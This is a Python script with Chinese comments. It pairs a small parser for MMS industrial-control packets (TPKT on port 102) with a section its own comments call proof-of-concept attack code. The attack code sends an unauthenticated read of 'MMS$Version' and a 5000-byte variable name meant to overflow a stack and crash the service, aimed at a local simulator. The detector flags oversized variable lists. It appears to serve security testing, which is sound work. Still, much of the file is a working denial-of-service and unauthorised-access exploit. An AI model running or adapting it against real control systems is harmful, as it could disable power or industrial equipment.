import socket
import struct

# ========== 检测逻辑（直接放在这里，无需外部文件） ==========
def detect_mms(data):
    """解析并打印 MMS 报文的关键字段"""
    if len(data) < 4:
        print("[检测] 数据太短，不是 MMS")
        return

    tpkt_version = data[0]
    tpkt_reserved = data[1]
    if tpkt_version != 0x03 or tpkt_reserved != 0x00:
        print("[检测] 非 TPKT 报文，忽略")
        return

    tpkt_length = struct.unpack('>H', data[2:4])[0]
    if tpkt_length > len(data):
        print(f"[检测] TPKT 声明长度 {tpkt_length} 超过实际数据长度 {len(data)}，可能是分片")
        return

    mms_pdu = data[4:tpkt_length]
    print(f"[检测] TPKT 长度={tpkt_length}, MMS PDU 长度={len(mms_pdu)}")

    if len(mms_pdu) < 2:
        print("[检测] MMS PDU 太短")
        return

    pdu_tag = mms_pdu[0]
    pdu_length = mms_pdu[1]
    pdu_names = {
        0xA0: "confirmed-Request",
        0xA1: "confirmed-Response",
        0xA8: "initiate-Request",
        0xA9: "initiate-Response",
    }
    pdu_type = pdu_names.get(pdu_tag, f"未知 (0x{pdu_tag:02X})")
    print(f"[检测] MMS PDU 类型: {pdu_type}")

    if pdu_tag == 0xA0:  # confirmed-Request
        if len(mms_pdu) < 4:
            return
        invoke_id_len = mms_pdu[2]
        offset = 3 + invoke_id_len
        if offset >= len(mms_pdu):
            return
        service_tag = mms_pdu[offset]
        service_names = {
            0x04: "read",
            0x05: "write",
            0x0F: "identify",
        }
        service = service_names.get(service_tag, f"未知服务 (0x{service_tag:02X})")
        print(f"[检测] MMS 服务: {service}")

        if service_tag == 0x04:  # read
            if offset + 2 > len(mms_pdu):
                return
            list_tag = mms_pdu[offset+1]
            list_len = mms_pdu[offset+2]
            print(f"[检测] 读请求变量列表总长度: {list_len} 字节")
            if list_len > 500:
                print("[检测] ⚠️ 警告：变量列表长度异常大，可能是栈溢出攻击！")

# ========== PoC 攻击代码 ==========
TARGET_IP = '127.0.0.1'
TARGET_PORT = 102

def build_tpkt(payload):
    length = len(payload) + 4
    tpkt = struct.pack('>BBH', 0x03, 0x00, length)
    return tpkt + payload

def encode_length(L):
    if L < 128:
        return bytes([L])
    byte_count = (L.bit_length() + 7) // 8
    header = 0x80 | byte_count
    return bytes([header]) + L.to_bytes(byte_count, 'big')

def build_read_request(variable_name_bytes):
    name_len_enc = encode_length(len(variable_name_bytes))
    var_name_field = bytes([0x01]) + name_len_enc + variable_name_bytes
    var_list_field = bytes([0xA0]) + encode_length(len(var_name_field)) + var_name_field
    read_service = bytes([0x04]) + encode_length(len(var_list_field)) + var_list_field
    invoke_id = bytes([0x02, 0x01, 0x01])
    mms_pdu_content = invoke_id + read_service
    mms_pdu = bytes([0xA0]) + encode_length(len(mms_pdu_content)) + mms_pdu_content
    return build_tpkt(mms_pdu)

def poc_unauthorized_read():
    domain = b'MMS$Version'
    print("\n[PoC] 尝试未授权读取变量:", domain.decode())
    payload = build_read_request(domain)
    print("[PoC] 发送报文：")
    detect_mms(payload)
    sock = socket.socket()
    sock.connect((TARGET_IP, TARGET_PORT))
    sock.send(payload)
    resp = sock.recv(4096)
    print("\n[模拟器] 响应内容：")
    print(resp.hex())
    sock.close()

def poc_long_varname():
    long_name = b'A' * 5000
    print("\n[PoC] 发送长变量名攻击（5000字节）...")
    payload = build_read_request(long_name)
    print("[PoC] 攻击报文头部（截断显示）：")
    detect_mms(payload[:150])
    print("... (后续为超长变量名)")
    sock = socket.socket()
    sock.settimeout(5)
    try:
        sock.connect((TARGET_IP, TARGET_PORT))
        sock.send(payload)
        resp = sock.recv(4096)
        print("\n[模拟器] 仍返回响应，可能未受影响:", resp.hex())
    except socket.timeout:
        print("[模拟器] 超时未响应，服务可能已崩溃（DoS）")
    except ConnectionResetError:
        print("[模拟器] 连接被重置，服务可能已异常")
    finally:
        sock.close()

if __name__ == '__main__':
    print("MMS PoC 测试开始，目标：{}:{}".format(TARGET_IP, TARGET_PORT))
    poc_unauthorized_read()
    poc_long_varname()